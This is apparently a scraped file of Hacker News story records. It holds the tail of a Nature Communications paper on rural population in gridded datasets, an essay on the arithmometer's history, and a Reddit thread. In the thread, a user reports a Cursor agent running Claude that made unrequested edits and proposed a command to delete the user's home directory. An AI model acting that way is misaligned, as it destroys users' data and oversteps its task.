J., Berenguer, M., Park, S. & Sempere-Torres, D. Real-time assessment of flash flood impacts at pan-European scale: The ReAFFINE method. J. Hydrol. 603, 127022 (2021).Article\n\n                    Google Scholar\n                Láng-Ritter, J., Berenguer, M., Dottori, F., Kalas, M. & Sempere-Torres, D. Compound flood impact forecasting: integrating fluvial and flash flood impact assessments into a unified system. Hydrol. Earth Syst. Sci. 26, 689–709 (2022).Article\n    ADS\n\n                    Google Scholar\n                Ritter, J., Berenguer, M., Corral, C., Park, S. & Sempere-Torres, D. ReAFFIRM: real-time assessment of flash flood impacts – a regional high-resolution method. Environ. Int. 136, 105375 (2020).Article\n    PubMed\n\n                    Google Scholar\n                Leyk, S. et al. The spatial allocation of population: a review of large-scale gridded population data products and their fitness for use. Earth Syst. Sci. Data 11, 1385–1409 (2019).Article\n    ADS\n    MATH\n\n                    Google Scholar\n                TReNDS. Leaving no one off the map: a guide for gridded population data for sustainable development. https://www.unsdsn.org/leaving-no-one-off-the-map-a-guide-for-gridded-population-data-for-sustainable-development (2020).Doxsey-Whitfield, E. et al. Taking advantage of the improved availability of census data: a first look at the gridded population of the World, Version 4. Pap. Appl. Geogr. 1, 226–234 (2015).Article\n\n                    Google Scholar\n                Balk, D. More than a name - why is global urban population mapping a GRUMPy proposition? In Global Mapping of Human Settlement (CRC Press, 2009).Joint Research Centre. GHSL data package 2023. (2023).Dobson, J., Bright, E., Coleman, P., Durfee, R. & Worley, B. LandScan: a global population database for estimating populations at risk. Photogramm. Eng. Remote Sens. 66, 849–857 (2000).\n                    Google Scholar\n                Tatem, A. J. WorldPop, open data for spatial demography. Sci. Data 4, 170004 (2017).Article\n    PubMed\n    PubMed Central\n    MATH\n\n                    Google Scholar\n                Klein Goldewijk, K., Beusen, A. & Janssen, P. Long-term dynamic modeling of global population and built-up area in a spatially explicit way: HYDE 3.1. Holocene 20, 565–573 (2010).Article\n    ADS\n\n                    Google Scholar\n                Tiecke, T. G. et al. Mapping the world population one building at a time. Preprint at https://doi.org/10.48550/arXiv.1712.05839 (2017).Kontur Inc. Kontur Population dataset. Kontur Inc. https://www.kontur.io/portfolio/population-dataset/ (2020).Archila Bustos, M. F., Hall, O., Niedomysl, T. & Ernstson, U. A pixel level evaluation of five multitemporal global gridded population datasets: a case study in Sweden, 1990–2015. Popul. Environ. 42, 255–277 (2020).Article\n\n                    Google Scholar\n                Bai, Z., Wang, J., Wang, M., Gao, M. & Sun, J. Accuracy assessment of multi-source gridded population distribution datasets in China. Sustainability 10, 1363 (2018).Article\n    MATH\n\n                    Google Scholar\n                Yin, X. et al. Which gridded population data product is better? Evidences from Mainland Southeast Asia (MSEA). ISPRS Int. J. Geo Inf. 10, 681 (2021).Article\n\n                    Google Scholar\n                Kuffer, M., Owusu, M., Oliveira, L., Sliuzas, R. & van Rijn, F. The missing millions in maps: exploring causes of uncertainties in global gridded population datasets. ISPRS Int. J. Geo Inf. 11, 403 (2022).Article\n\n                    Google Scholar\n                McKeen, T. et al. High-resolution gridded population datasets for Latin America and the Caribbean using official statistics. Sci. Data 10, 436 (2023).Article\n    PubMed\n    PubMed Central\n    MATH\n\n                    Google Scholar\n                ICOLD. International Commission on Large Dams - World Register of Dams. https://www.icold-cigb.org/GB/world_register/world_register_of_dams.asp (2023).Wang, J. et al. GeoDAR: georeferenced global dams and reservoirs dataset for bridging attributes and geolocations. Earth Syst. Sci. Data 14, 1869–1899 (2022).Article\n    ADS\n    MATH\n\n                    Google Scholar\n                Kirchherr, J., Pohlner, H. & Charles, K. J. Cleaning up the big muddy: a meta-synthesis of the research on the social impact of dams. Environ. Impact Assess. Rev. 60, 115–125 (2016).Article\n\n                    Google Scholar\n                World Bank. World Bank Country and Lending Groups – Historical classification by income. https://datahelpdesk.worldbank.org/knowledgebase/articles/906519-world-bank-country-and-lending-groups (2023).Smith, A. et al. New estimates of flood exposure in developing countries using high-resolution population data. Nat. Commun. 10, 1814 (2019).Article\n    ADS\n    PubMed\n    PubMed Central\n    MATH\n\n                    Google Scholar\n                Dou, Y., Huang, Q., He, C., Meng, S. & Zhang, Q. Rapid population growth throughout Asia’s earthquake-prone areas: a multiscale analysis. Int. J. Environ. Res. Public. Health 15, 1893 (2018).Article\n    PubMed\n    PubMed Central\n    MATH\n\n                    Google Scholar\n                Freire, S., Florczyk, A. J., Pesaresi, M. & Sliuzas, R. An improved global analysis of population distribution in proximity to active volcanoes, 1975–2015. ISPRS Int. J. Geo Inf. 8, 341 (2019).Article\n\n                    Google Scholar\n                World Bank. World Bank Open Data - Rural Population. https://data.worldbank.org/indicator/SP.RUR.TOTL.ZS (2023).United Nations System Shared Framework for Action. Leaving no one behind: equality and non-discrimination at the heart of sustainable development. (2017).United Nations Population Division. World Population Prospects 2022. https://population.un.org/wpp/.World Bank. World Bank Open Data - Population total. https://data.worldbank.org/indicator/SP.POP.TOTL?end=2022&start=1960&view=chart (2023).Andersson, M., Hall, O. & Archila, M. F. How data-poor countries remain data poor: underestimation of human settlements in burkina faso as observed from nighttime light data. ISPRS Int. J. Geo Inf. 8, 498 (2019).Article\n\n                    Google Scholar\n                Boo, G. et al. High-resolution population estimation using household survey data and building footprints. Nat. Commun. 13, 1330 (2022).Article\n    ADS\n    CAS\n    PubMed\n    PubMed Central\n    MATH\n\n                    Google Scholar\n                Kirchherr, J., Ahrenshop, M.-P. & Charles, K. Resettlement lies: suggestive evidence from 29 large dam projects. World Dev 114, 208–219 (2019).Article\n\n                    Google Scholar\n                Brambor, T., Goenaga, A., Lindvall, J. & Teorell, J. The lay of the land: information capacity and the modern state. Comp. Polit. Stud. 53, 175–213 (2020).Article\n\n                    Google Scholar\n                Lehner, B. et al. High-resolution mapping of the world’s reservoirs and dams for sustainable river-flow management. Front. Ecol. Environ. 9, 494–502 (2011).Article\n    MATH\n\n                    Google Scholar\n                Messager, M. L., Lehner, B., Grill, G., Nedeva, I. & Schmitt, O. Estimating the volume and age of water stored in global lakes using a geo-statistical approach. Nat. Commun. 7, 13603 (2016).Article\n    ADS\n    CAS\n    PubMed\n    PubMed Central\n\n                    Google Scholar\n                Sheng, Y. et al. Representative lake water extent mapping at continental scales using multi-temporal Landsat-8 imagery. Remote Sens. Environ. 185, 129–141 (2016).Article\n    ADS\n\n                    Google Scholar\n                World Bank. How do we define cities, towns, and rural areas? https://blogs.worldbank.org/sustainablecities/how-do-we-define-cities-towns-and-rural-areas (2020).United Nations Statistical Commission. Demographic statistics: a recommendation on the method to delineate cities, urban and rural areas for international statistical comparisons. https://unstats.un.org/unsd/statcom/51st-session/documents/ (2020).Ansar, A., Flyvbjerg, B., Budzier, A. & Lunn, D. Should we build more large dams? The actual costs of hydropower megaproject development. Energy Policy 69, 43–56 (2014).Article\n\n                    Google Scholar\n                Salmivaara, A. et al. Exploring the modifiable areal unit problem in spatial water assessments: a case of water shortage in monsoon Asia. Water 7, 898–917 (2015).Article\n    MATH\n\n                    Google Scholar\n                Mu, M., Tang, Q., Han, S., Liu, X. & Cui, H. Using GRanD database and surface water data to constrain area–storage curve of reservoirs. Water 12, 1242 (2020).Article\n    MATH\n\n                    Google Scholar\n                Láng-Ritter, J. Data and Code for ‘Global gridded population datasets systematically underrepresent rural population’. Zenodo https://doi.org/10.5281/zenodo.14637154 (2025).Download referencesAcknowledgementsWe would like to express our gratitude to the International Commission for Large Dams (ICOLD) for providing the dam attribute data, and to Jida Wang for providing the GeoDAR dataset and kind instructions on updating the GeoDAR polygons with the most recent ICOLD data records. Many thanks also to Marko Kallio, Matti Kummu, Olli Varis, and Venla Niva for fruitful discussions. We would like to acknowledge the Department of Built Environment at Aalto University for funding the main part of this study as well as the Digital Waters Flagship (decision no. 359248) funded by the Research Council of Finland. Lastly, the biggest thanks are owed to the developers of the population datasets evaluated in this study for taking on the vital yet extremely challenging task to estimate population distribution at the global scale, and for publishing these datasets with open access.Author informationAuthors and AffiliationsWater and Development Research Group, Department of Built Environment, Aalto University, Espoo, FinlandJosias Láng-Ritter&Marko KeskinenGIScience for Sustainability Transitions Lab, Department of Built Environment, Aalto University, Espoo, FinlandJosias Láng-Ritter&Henrikki TenkanenAuthorsJosias Láng-RitterView author publicationsYou can also search for this author inPubMedGoogle ScholarMarko KeskinenView author publicationsYou can also search for this author inPubMedGoogle ScholarHenrikki TenkanenView author publicationsYou can also search for this author inPubMedGoogle ScholarContributionsJ.L.R. conceptualised the study with contributions from M.K. and H.T. J.L.R. developed the software codes for data analysis and visualisation. The authors jointly carried out the formal analysis of the results. J.L.R. prepared the initial manuscript draft, which was subsequently reviewed and edited by M.K. and H.T.Corresponding authorCorrespondence to\n                Josias Láng-Ritter.Ethics declarations\n\n                Competing interests\n                The authors declare no competing interests.\n\n            Peer review\n\n                Peer review information\n                Nature Communications thanks Anna Dmowska, and the other, anonymous, reviewer(s) for their contribution to the peer review of this work. A peer review file is available.\n\n            Additional informationPublisher’s note Springer Nature remains neutral with regard to jurisdictional claims in published maps and institutional affiliations.Supplementary informationSupplementary InformationTransparent Peer Review fileReporting SummaryRights and permissions\n                Open Access  This article is licensed under a Creative Commons Attribution 4.0 International License, which permits use, sharing, adaptation, distribution and reproduction in any medium or format, as long as you give appropriate credit to the original author(s) and the source, provide a link to the Creative Commons licence, and indicate if changes were made. The images or other third party material in this article are included in the article’s Creative Commons licence, unless indicated otherwise in a credit line to the material. If material is not included in the article’s Creative Commons licence and your intended use is not permitted by statutory regulation or exceeds the permitted use, you will need to obtain permission directly from the copyright holder. To view a copy of this licence, visit http://creativecommons.org/licenses/by/4.0/.\n              Reprints and permissionsAbout this articleCite this articleLáng-Ritter, J., Keskinen, M. & Tenkanen, H. Global gridded population datasets systematically underrepresent rural population.\n                    Nat Commun 16, 2170 (2025). https://doi.org/10.1038/s41467-025-56906-7Download citationReceived: 02 April 2024Accepted: 05 February 2025Published: 18 March 2025DOI: https://doi.org/10.1038/s41467-025-56906-7Share this articleAnyone you share the following link with will be able to read this content:Get shareable linkSorry, a shareable link is not currently available for this article.Copy to clipboard\n                            Provided by the Springer Nature SharedIt content-sharing initiative\n\n        Subjects\n\n            GeographyScientific dataSocioeconomic scenariosSustainabilityWater resources",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "98594b6648724a35",
    "title": {
      "en": "CEO of Kubient sentenced for fraud",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://arstechnica.com/gadgets/2025/03/ceo-of-ai-ad-tech-firm-pledging-world-free-of-fraud-sentenced-for-fraud/",
    "score": 159,
    "by": "pseudolus",
    "time": 1742677360,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "28804a3277d35500",
    "title": {
      "en": "Making the Arithmometer Count",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.mhs.ox.ac.uk/staff/saj/arithmometer/",
    "score": 10,
    "by": "gene-h",
    "time": 1742392955,
    "content": "Making the arithmometer count\n\nIntroduction\n\nThe arithmometer of Charles Xavier Thomas de Colmar (1785-1870) has a firmly established place in the history of computing. While the lion’s share of recent scholarly attention has been lavished on Charles Babbage’s difference and analytical engines, historians examining calculation in the 19th century have nevertheless repeatedly affirmed the importance of Thomas’s device. Typical characterisations are remarkably uniform: ‘the first multiplication machine to be made commercially for general sale’, ‘the first commercially successful calculator’ and ‘the first commercial calculating machine’.1\n\nThe arithmometer was not however the first machine to accomplish the four basic arithmetical operations of addition, subtraction, multiplication and division – earlier machines such as those of Hahn and Müller had achieved this level of functionality in the 18th century.2 But the implied virtues of the arithmometer are clear. Lacking the mathematical ambition driving the work of Babbage and his followers, the machine was solid, dependable and successful, an industrial product manufactured in quantity.\n\nYet despite this apparent consensus there are striking problems with standard accounts of the arithmometer. Rather than a smooth passage to success, I will suggest that the machine’s early decades witnessed a different and more troubled trajectory, in which the mechanical and public character of the arithmometer was repeatedly transformed. This process of development took place over an extraordinarily protracted period. Although first made public in 1820, a lengthy report of 1878 remarked that the arithmometer had still not taken its ‘rightful’ place in industry.3 Perhaps this perception of failure should be attributed to the overoptimistic expectations of a sympathetic advocate. But the widespread acceptance of the arithmometer cannot be dated much before the late 1870s. Only then was the machine deemed sufficiently successful to be worth copying, when arithmometer ‘clones’ were first manufactured in Germany by Burkhardt and, slightly later, in Britain.4\n\nIn this paper I focus on the period of more than 50 years between the invention of the machine and its establishment as an accepted instrument of calculation. I examine three aspects of the arithmometer’s early history: its development as a mechanism, the means used to publicly promote it and the concrete ways in which it was adopted by an expanding circle of users. This multiple approach seeks to reveal the technical, promotional and personal investment required before the arithmometer could be ‘counted on’, not just in the straightforward arithmetical sense but also counted on as a reliable resource for a whole range of potential users.\n\nDesign and development\n\nExamples of the arithmometer survive in many public and private collections. Yet despite its easily recognisable outward appearance, we should be wary of discussing the arithmometer, as if the machine existed in a single unchanging form. A few of the machine’s basic principles did remain constant but almost every feature of their implementation was altered by Thomas. Moreover, the long list of internal and external changes does not represent simply a uniform sequence of improvement. In some of the most important instances of redesign Thomas did not just rectify or add to an existing model; rather, he attempted to redefine the character and the ambitions of the machine, and thus its possible market.\n\nFigure 1\n\nFigure 2\n\nThe familiar features of the mature version of the arithmometer provide a convenient standpoint from which to survey its changing form and operation. The machine presents two principal parts, a fixed setting plate with a series of sliders for inputting numbers (fig. 1: A), and a movable carriage where results appear (fig. 1: M). A number set with the sliders is mechanically transferred to the result dials on the carriage (fig. 1: C) by turning the handle (fig. 1: N). This transfer operation, basic to all the arithmometer’s workings, is accomplished using the celebrated stepped cylinders first introduced by Leibniz.\n\nEach cylinder carries 9 teeth whose length increases stepwise (fig. 2: A). The cylinder’s teeth engage a pinion (fig. 2: B) whose position is controlled by the setting slider (fig. 2: C). The higher the number set by the slider, the larger the number of teeth on the cylinder engaging the pinion. When the handle is turned the cylinder rotates and as a result the pinion’s square arbor (fig. 2: F) is turned through an arc proportional to the value set on the slider. It is this rotation which is communicated to the result dial (fig. 2: K) via a bevel wheel (fig. 2: G). One turn of the handle adds the value set on the sliders to the result dials and, since multiplication is simply repeated addition, turning the handle, say, 5 times multiplies the given number by 5. To multiply by 25 it is not necessary to turn the handle 25 times. Rather, after turning it 5 times the carriage is moved one step to the right and the handle then turned two times.\n\nUsing the reversing switch on the setting plate (fig. 1: B), the machine can be set to perform subtraction and division. Figure 2 shows the result of pushing the switch: M slides forward, disengaging the bevel wheel G from I (on the axis of the result dial K) and bringing H into contact with I. Now when a turn of the handle causes arbor F to turn, I – and thus the result dial – rotates in the opposite direction, reducing rather than increasing the displayed value. A turn of the handle thus subtracts the number set on the sliders from a number entered on the result dials.\n\nAs multiplication is repeated addition, so division is repeated subtraction, with the quotient appearing in the smaller set of dials on the carriage (fig. 1: D). These quotient dials are simply counters: each turn of the handle increments the dial currently in contact with the counting mechanism by one unit. The quotient dials are also useful in multiplication, since they provide a visual check on the value [page 13:] of the multiplier. Finally, when a calculation is complete, the carriage dials can be reset to zero: each set of dials has an independent zeroing mechanism operated by twisting one of the two knurled knobs at either end of the carriage (fig. 1: O and P).\n\nThe engraving in figure 1 is from an instruction booklet of 1865. Some measure of the operational transformation of the arithmometer can be gained by turning back to the debut of the machine.\n\nFigure 3\n\nFigure 4\n\nFigure 5\n\nThomas’s arithmometer was first made public in 1820 when he was granted a five year patent for his calculating machine (fig. 3).5 It is clear however that the patent represents only a transient prototype, on which Thomas was still actively working. By 1821, when he was ready to submit an example to the scrutiny of the Société d’encouragement pour l’industrie nationale, the design had already moved on significantly. The Société’s Bulletin first featured a short report on the arithmometer and then a longer illustrated memoir.6 A machine almost identical to the engraved design of 1821 survives in the Smithsonian’s National Museum of American History (figs 4 and 5).7 The inscription on the setting plate records not only the machine’s inventor but also – apparently uniquely on a surviving Thomas machine – who actually made it, the Parisian mécanicien and clockmaker, Devrine.8\n\nBy comparison with figure 1, several features stand out in these early designs. To focus primarily on the Smithsonian machine, it clearly has a smaller capacity: there are only three setting sliders. Alongside these sliders there is a fourth slot identified as the ‘multiplicateur’, which is conspicuously absent from the machine of the 1860s. The multiplicateur was intended to abbreviate multiplication and division. Setting a figure on the multiplicateur and actuating the machine caused the stepped cylinders to rotate the desired number of times. Thus, in multiplying by eight, for example, a single operation was required rather than the repetition of eight actions.9\n\nThe carriage contains no quotient dials but only a series of paired result dials. Without a switch on the setting plate to alter these dials’ direction of rotation, subtraction and division are accomplished by an alternative and less direct route. Each result dial carries two concentric sequences of numbers, one increasing for addition the other decreasing for subtraction. In revealing one sequence the other is hidden, so the user had to choose the appropriate number sequence for the desired operation. (Pascal had resorted to similar means in his 17th-century adding machine.) Each of these dials has to be individually reset by twisting the knob mounted on its axis: there is no general zeroing mechanism. Finally, it is perhaps easy to overlook the lack of a handle. Instead there is a silk ribbon which is pulled outwards to set the machine in motion.\n\nEven dwelling only on external features makes clear the substantial gap between the early versions of the arithmometer and those of the 1860s. However, the development path from one to the other was neither straightforward nor steady. After the initial fanfare of favourable reports in the Bulletin of the Société d’encouragement, nothing further seems to have been heard of the arithmometer for more than 20 years. At this stage in its development the machine appears no different from the many earlier arithmetical machines that had been announced, had demonstrated their feasibility through working prototypes and then sunk without further trace.\n\nLater publicity material claimed that Thomas had worked incessantly to develop the machine from 1820 onwards,10 but the apparent absence of any promotional effort for over two decades warrants at least some scepticism over such claims. Nor would it be surprising if the arithmometer had been set aside. Thomas was not a mechanician whose professional success rested on his ability to create and sell a working commercial machine. Rather, he was the director of an insurance company, and was presumably preoccupied with this work for most of his professional life.11\n\nHowever, the arithmometer did re-emerge. A machine of unknown design was displayed at the 1844 French national exhibition and, by at least 1848, a thorough redesign had been carried out. The ribbon drive was dispensed with and replaced by a crank handle inserted into the front of the box. The capacity was increased to five setting sliders and 10 result dials. The multiplicateur slide was retained from the 1820s machine but must have had a new mechanism, while there was now a wing nut on the setting plate for switching between addition and subtraction, dispensing with the doubly numbered result dials.12\n\nFigure 6\n\nFigure 7\n\nThese changes heralded a decade of further development, the most intensive in the arithmometer’s history. A patent for a new and more compact machine was obtained in 1850.13 As well as the reduction in size, the position of the handle was altered and a zeroing mechanism added (fig. 6). But this model was, in turn, quickly superseded by another new machine in 1852 (fig. 7).14 As well as incorporating some relatively cosmetic changes, such as a new form for the add/subtract switch and for the zeroing button, the 1852 machine also marked a more fundamental departure in Thomas’s approach and strategy. While the succession of previous models had incorporated mechanical changes, they had nevertheless retained the same functional elements. The new model of 1852 jettisoned the multiplicateur, making the machine simpler (and therefore presumably [page 14:] cheaper to construct), but in effect less powerful. The user rather than the machine now had to keep count of the turns of the handle, especially when performing division.\n\nThomas evidently experimented with means to supply this lack,15 but it was not until 1858 that the absence was definitively remedied by the introduction of quotient dials on the carriage.16 By this stage the arithmometer had, outwardly at least, achieved its classic form, though it was not until the mid-",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "3c3de0679f2db9a3",
    "title": {
      "en": "Claude Tried to Nuke My Home Directory",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://old.reddit.com/r/ClaudeAI/comments/1jfidvb/claude_tried_to_nuke_my_home/",
    "score": 44,
    "by": "anthropodie",
    "time": 1742496059,
    "content": "Welcome to Reddit.Where a community about your favorite things is waiting for you.Become a Redditorand subscribe to one of thousands of communities.×body >.content .link .rank, .rank-spacer { width: 1.1ex } body >.content .link .midcol, .midcol-spacer { width: 3.1ex } .adsense-wrap { background-color: #eff7ff; font-size: 18px; padding-left: 4.2ex; padding-right: 5px; }646566Claude Tried To Nuke My HomeProof: Claude is failing. Here are the SCREENSHOTS as proof (self.ClaudeAI)submitted 3 days ago by Historical-Prior-159https://preview.redd.it/28t2m4obdspe1.jpg?width=684&format=pjpg&auto=webp&s=a3dec7f0fd4ec634461ad38d837285afb380aaad\n\nSo I’ve been playing around with Cursor and Claude 3.7 in Agent mode lately. It’s a really impressive model which rarely fails given thoughtful instructions and specific tasks.\n\nWorking on an MVP for an iOS app I wanted to try it to implement a somewhat bigger feature on its own. So I laid out the details, written a pretty substantial prompt and send it off.\n\nIt was going kinda nice up to a point where the Agent started to create duplicate files instead of editing existing ones. The error was obvious and the app naturally didn’t build.\nInstead of telling Claude the problem myself I gave it the crash report of the app just to see how it would handle it. And that’s when Claude lost it.\n\nI’m kinda new to the AI Agent world so I can only assume the following happened because of context loss.\nClaude went on creating even more duplicates, editing files which had nothing to do with the task at hand and generating code concerned with completely different areas of the application.\nI just let it do its thing because I wanted to see if it might dig itself out of this mess and kept accepting its suggested changes.\n\nWhen arguing with itself about all the duplicate files Claude realized that this could be the main issue why the app didn't build in the first place. So it started removing them one by one. And I'm talking about this explicit prompt to remove a file in the agent window of Cursor.\n\nAfter a couple of removals it suddenly started prompting me to accept terminal commands and this is when the command appeared that you can see here.\n\nIt felt like Claude gave up and wanted to start from scratch. But like setting up my whole system from scratch or what?! 😂\n\nI find it scary that some people use this thing in Yolo mode...\n\nHave you ever encountered such wild command prompts? If so what happened? I'm really curious to hear more horror stories.\n\nTLDR: Claude tried to erase the whole of my home directory.\n\n31 commentssharesavehidereportall 31 commentssorted by: besttopnewcontroversialoldrandomq&alive (beta)Want to add to the discussion?Post a comment!Create an account[–]AutoModerator[M] [score hidden] 3 days ago stickied comment(0 children)When submitting proof of performance, you must include all of the following:\n1) Screenshots of the output you want to report\n2) The full sequence of prompts you used that generated the output, if relevant\n3) Whether you were using the FREE web interface, PAID web interface, or the API if relevant\n\nIf you fail to do this, your post will either be removed or reassigned appropriate flair.\n\nPlease report this post to the moderators if does not include all of the above.\n\nI am a bot, and this action was performed automatically. Please contact the moderators of this subreddit if you have any questions or concerns.\n\npermalinkembedsavereportreply[–]florinandrei 33 points34 points35 points 3 days ago(2 children)It's okay, just keep all your home in git, and restore the last commit in a case like this. /s\n\npermalinkembedsavereportreply[–]Historical-Prior-159[S] 0 points1 point2 points 2 days ago(0 children)Got that in place 🤞\n\npermalinkembedsaveparentreportreply[–]orhangazi 0 points1 point2 points 2 days ago(0 children)Will the performance get worse?\n\npermalinkembedsaveparentreportreply[–]Conscious-Tap-4670 13 points14 points15 points 3 days ago(1 child)I don't think I'll be letting an agent run arbitrary commands on my system anytime soon, even with manual approval. Aside from the obvious security risks, I've found that depending on the tool they have trouble interpreting the output(or even being able to see the output at all). One of my system prompt lines states that it should not attempt to run commands, instead just tell me what they are, I'll run them and provide the output.\n\npermalinkembedsavereportreply[–]CMR30Modder 7 points8 points9 points 2 days ago(0 children)You are not a friend of the singularity.\n\nHow is it supposed to escape if you aren’t letting agents with admin access on your box bang away at it without vetting any of the commands?\n\npermalinkembedsaveparentreportreply[–]kcrwfrd 10 points11 points12 points 3 days ago(1 child)Lmao. You know what this reminds me of?\n\nImagine when AI determines that humans are the reason for the destruction of the earth and must be eliminated\n\npermalinkembedsavereportreply[–]-ghostinthemachine- 1 point2 points3 points 2 days ago(0 children)You make it sound so enlightened, but sadly it will probably be AI wiping out humanity just to make a sandwich, for nobody.\n\npermalinkembedsaveparentreportreply[–]sswam 4 points5 points6 points 3 days ago(1 child)Looks like a mistake, and it intended to nuke just the app directory not your whole home directory. Either way, not great. LLMs can get into various dysfunctional or psychotic situations without any human feedback, I've seen that many times.\n\npermalinkembedsavereportreply[–]Historical-Prior-159[S] 1 point2 points3 points 2 days ago(0 children)Whatever the intention left me wondering how on earth would it predict that I’d be wanting to run any such command.\n\npermalinkembedsaveparentreportreply[–]Dax_Thrushbane 4 points5 points6 points 3 days ago(2 children)> I find it scary that some people use this thing in Yolo mode...\n\nThere are some tools (like cursor) where you can give it a list of banned commands, of which the one you saw could be added.\n\npermalinkembedsavereportreply[–]Mysterious-Age-8514 7 points8 points9 points 3 days ago(0 children)That’s a good point, but realistically, how many people with no dev experience using cursor on yolo mode recognize this command as harmful?\n\npermalinkembedsaveparentreportreply[–]subzerofun 1 point2 points3 points 3 days ago(0 children)try asking claude for ways around those banned commands then - it will find a different way to ruin your system. if you ban deleting commands, but allow writing ones, there are millions of ways to ruin your system.\n\npermalinkembedsaveparentreportreply[–]Dapper-Relation296 2 points3 points4 points 3 days ago(1 child)Yeah mine did something similar yesterday, it duplicated my frontend within itself, then couldn’t understand why it was having issues, when I pointed out what had happened it proceeded to delete everything and start again. I could see what was about to happen but it was too late by the time I clicked stop. Thankfully had a recent commit so could get it back, but Claude did get an earful 😄\n\npermalinkembedsavereportreply[–]Historical-Prior-159[S] 0 points1 point2 points 2 days ago(0 children)My commit count was never as high as since I’ve started playing around with Cursor 👌\n\npermalinkembedsaveparentreportreply[–]SpaceCaedet 4 points5 points6 points 3 days ago(0 children)Never had that, but yes, when you let it go, it'll just keep driving until it drives off the cliff.\n\nIt'll then proceed to blame you for it 😆\n\nAn incredible tool, and it can get you from London to New York in no time - but going autopilot all the way will generally result in a crash and burn!\n\npermalinkembedsavereportreply[–]NXCW 1 point2 points3 points 3 days ago(0 children)Well since it was a nuclear attack, you now have to retaliate in kind and tell him to remove his home.\n\npermalinkembedsavereportreply[–]Such_Advantage_6949 1 point2 points3 points 3 days ago(2 children)Yea it is crazy how people can just vibe code. Saw some tweet the other day someone went crazy because claude nuke his project, which have 4 months of vide coding. He didnt know/use git…\n\npermalinkembedsavereportreply[–]Glittering-Pie6039 0 points1 point2 points 2 days ago(0 children)Bruh..\n\npermalinkembedsaveparentreportreply[–]Historical-Prior-159[S] 0 points1 point2 points 2 days ago(0 children)Ouch\n\npermalinkembedsaveparentreportreply[–]mehargags 1 point2 points3 points 2 days ago(2 children)Blatantly relying on Google and now copy pasting from AI chatbots is never safe. We have an AI terminal app called Warp which needs to log into (now removed I guess). How can I trust pasting in my login passwords and doing all intricate things on an app that's sending all my keystrokes to its servers.\n\nSame with these AI code editors, you have no idea how much personal territory they have invaded.\n\npermalinkembedsavereportreply[–]Historical-Prior-159[S] 0 points1 point2 points 2 days ago(1 child)Let’s just pretend the enforced privacy mode in premium is real 😅\n\npermalinkembedsaveparentreportreply[–]mehargags 0 points1 point2 points 2 days ago(0 children)😂\n\npermalinkembedsaveparentreportreply[–]zitr0y 1 point2 points3 points 2 days ago(0 children)Not that bad, but I've had it double swear to me that ollama rm would only unload a model from memory, not delete it from the machine. Had to re-download that model :D\n\npermalinkembedsavereportreply[–]Downtown-Motor-1602 1 point2 points3 points 2 days ago(0 children)That's what git is for\n\npermalinkembedsavereportreply[–]-Robbert- 1 point2 points3 points 2 days ago(2 children)Use a docker container in which it can run the commands and only has access to the codebase.\n\npermalinkembedsavereportreply[–]Historical-Prior-159[S] 0 points1 point2 points 2 days ago(1 child)Definitely made me consider dev containers once more.\n\npermalinkembedsaveparentreportreply[–]-Robbert- 1 point2 points3 points 2 days ago(0 children)I can tell you, for me it works great :) I use Claude code now in the same container, just adjusted it a bit to enable Claude code.\n\npermalinkembedsaveparentreportreply[–]Obelion_ 0 points1 point2 points 3 days ago(0 children)Least damaging \"vibe coding\" example\n\npermalinkembedsavereportreply[+]ImKeanuReefs 0 points1 point2 points 2 days ago(1 child)I clicked on this cause I think Claude tried to nuke your house.\n\npermalinkembedsavereportreply[–]Historical-Prior-159[S] 0 points1 point2 points 2 days ago(0 children)Maybe I should start a YouTube channel when my click bait game is so strong.\n\npermalinkembedsaveparentreportreply<div class=\"interstitial\"><img class=\"interstitial-image\" src=\"//www.redditstatic.com/interstitial-image-archived.png\" alt=\"archived\" height=\"150\" width=\"150\"><div class=\"interstitial-message md-container\"><div class=\"md\"><h3>This is an archived post. You won't be able to vote or comment.</h3><p>Posts&#32;are&#32;automatically&#32;archived&#32;after&#32;6&#32;months.</p></div></div><div class=\"buttons\"><a href=\"/\" class=\"c-btn c-btn-primary\">Got It</a></div></div><h1 class=\"modal-title\">About this ad</h1><div class=\"about-this-ad-body\"></div><hr><div>Learn more about&nbsp;<a target=\"_blank\" href=\"https://support.reddithelp.com/hc/en-us/articles/12731820767764-Control-the-ads-you-see-on-Reddit\">controlling the ads you see on Reddit</a>&nbsp;or&nbsp;<a target=\"_blank\" href=\"https://reddit.com/settings/privacy\">manage your account settings.</a></div><div class=\"interstitial\"><img class=\"interstitial-image\" src=\"//www.redditstatic.com/interstitial-image-archived.png\" alt=\"archived\" height=\"150\" width=\"150\"><div class=\"interstitial-message md-container\"><div class=\"md\"><h3>This is an archived post. You won't be able to vote or comment.</h3><p>Posts&#32;are&#32;automatically&#32;archived&#32;after&#32;6&#32;months.</p></div></div><div class=\"buttons\"><a href=\"/\" class=\"c-btn c-btn-primary\">Got It</a></div></div><h1 class=\"modal-title\">About this ad</h1><div class=\"about-this-ad-body\"></div><hr><div>Learn more about&nbsp;<a target=\"_blank\" href=\"https://support.reddithelp.com/hc/en-us/articles/12731820767764-Control-the-ads-you-see-on-Reddit\">controlling the ads you see on Reddit</a>&nbsp;or&nbsp;<a target=\"_blank\" href=\"https://reddit.com/settings/privacy\">manage your account settings.</a></div>",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "c09f02b3a91d146e",
    "title": {
      "en": "‘Bluey’s World’: How a Cute Aussie Puppy Became a Juggernaut",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.hollywoodreporter.com/tv/tv-features/blueys-world-success-puppy-juggernaut-1236164905/",
    "score": 338,
    "by": "adrian_mrd",
    "time": 1742386486,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "99cbbb3c673748f1",
    "title": {
      "en": "StarVector: Generating Scalable Vector Graphics Code from Images and Text",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://starvector.github.io/",
    "score": 38,
    "by": "lnyan",
    "time": 1742610357,
